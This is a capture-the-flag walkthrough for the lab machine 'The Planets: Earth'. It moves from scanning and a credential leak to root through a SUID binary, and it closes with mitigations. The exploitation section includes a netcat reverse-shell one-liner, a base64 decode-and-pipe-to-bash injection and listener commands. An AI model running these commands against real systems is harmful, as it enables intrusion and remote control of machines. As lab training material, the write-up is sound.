# The Planets: Earth — Walkthrough

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange) ![OS](https://img.shields.io/badge/OS-Linux-blue) ![Status](https://img.shields.io/badge/Status-Completed-success)

| | |
|---|---|
| **Machine** | The Planets: Earth |
| **Series** | The Planets |
| **Author** | SirFlash |
| **Release Date** | 2 Nov 2021 |
| **OS** | Linux |

---

## 🔍 Overview

Earth is a Linux machine that involves virtual host discovery, credential leakage via `robots.txt`, XOR decryption, command injection for a reverse shell, and privilege escalation through a misconfigured SUID binary.

---

## 1️⃣ Reconnaissance

### Network Discovery

\`\`\`bash
ifconfig
netdiscover -i eth0
\`\`\`

**Target IP:** `192.168.1.12`

### Port Scanning

\`\`\`bash
nmap -sV -sC -v -T4 192.168.1.12
\`\`\`

**Open Ports:**

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 80/tcp | HTTP |
| 443/tcp | HTTPS (`earth.local`, `terratest.earth.local`) |

---

## 2️⃣ Enumeration

### Configure Virtual Hosts

\`\`\`bash
sudo nano /etc/hosts
\`\`\`

\`\`\`
192.168.1.12 earth.local
192.168.1.12 terratest.earth.local
\`\`\`

### Directory Brute-Forcing

\`\`\`bash
gobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirb/big.txt
\`\`\`
🔎 Found: `/admin`

\`\`\`bash
gobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlists/dirb/big.txt
\`\`\`
🔎 Found: `robots.txt`

### Credential Leak via robots.txt

Visited `https://terratest.earth.local/robots.txt` → led to `testingnotes.txt`, which revealed:

- Username: `terra`
- Password: XOR-encrypted
- Encryption key location: `testdata.txt`

Both files were then pulled directly from the web server to retrieve the encrypted password and the XOR key.

---

## 3️⃣ Exploitation

### XOR Decryption

Using **CyberChef**:

1. Recipe: `From Hex` → `XOR`
2. Applied the key retrieved from `testdata.txt`
3. Input: hex string found on the `earth.local` homepage
4. Baked to reveal the plaintext password: `earthclimatechangebad4humans`

### Admin Panel Access

Logged into `http://earth.local/admin` with:

- **Username:** `terra`
- **Password:** `earthclimatechangebad4humans`

Access granted as the `apache` user, exposing the user flag at `/var/earth_web/user_flag.txt`.

### Command Injection → Reverse Shell

The admin panel included a command execution tool vulnerable to injection.

**Generate a base64-encoded reverse shell payload:**

\`\`\`bash
echo 'nc -e /bin/bash 192.168.1.10 4444' | base64
\`\`\`

**Start a listener:**

\`\`\`bash
nc -lvnp 4444
\`\`\`

**Inject the payload via the admin command tool:**

\`\`\`bash
echo '<base64_payload>' | base64 -d | bash
\`\`\`

Shell connects back on the listener. Upgraded to a full TTY:

\`\`\`bash
python -c 'import pty; pty.spawn("/bin/bash")'
\`\`\`

---

## 4️⃣ Privilege Escalation

### Enumerate SUID Binaries

\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
\`\`\`

🔎 Found a custom SUID binary: `/usr/bin/reset_root`

### Analyze the Binary

\`\`\`bash
/usr/bin/reset_root
\`\`\`

Output: `RESET FAILED, ALL TRIGGERS ARE NOT PRESENT`

The binary expected specific "trigger" files to exist before it would run.

### Create the Missing Triggers

\`\`\`bash
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
\`\`\`

### Re-run the Binary

\`\`\`bash
/usr/bin/reset_root
\`\`\`

Output: `RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth`

### Escalate to Root

\`\`\`bash
su root
# Password: Earth
\`\`\`

Root flag captured at `/root/root_flag.txt` ✅

---

## 🛡️ Key Vulnerabilities

1. **Directory listing** — `/admin` was enumerable
2. **Sensitive files exposed via `robots.txt`**
3. **Weak encryption** — XOR is trivially reversible
4. **Weak admin credentials**
5. **Command injection** in the admin tool → RCE
6. **Insecure SUID binary** allowing controlled password resets
7. **Weak root password** set by the vulnerable binary

## 🩹 Mitigations

- Disable directory listing on production web servers
- Never expose credentials or secrets via `robots.txt` or public paths
- Use strong, industry-standard encryption (AES, bcrypt, etc.) — not XOR
- Enforce strong password policies across all accounts
- Sanitize and validate all user input to prevent command injection
- Audit and remove unnecessary SUID binaries
- Prefer SSH key-based authentication over passwords
- Deploy a Web Application Firewall (WAF)

---

## 🧰 Tools Used

`nmap` · `gobuster` · `CyberChef` · `netcat` · `base64` · `python (pty)`

## 🧠 Techniques Covered

Network enumeration · Virtual host discovery · Web enumeration · XOR cryptanalysis · Command injection / RCE · Reverse shell handling · SUID binary abuse · Privilege escalation

---

*Writeup for educational purposes. Machine solved as part of "The Planets" series.*
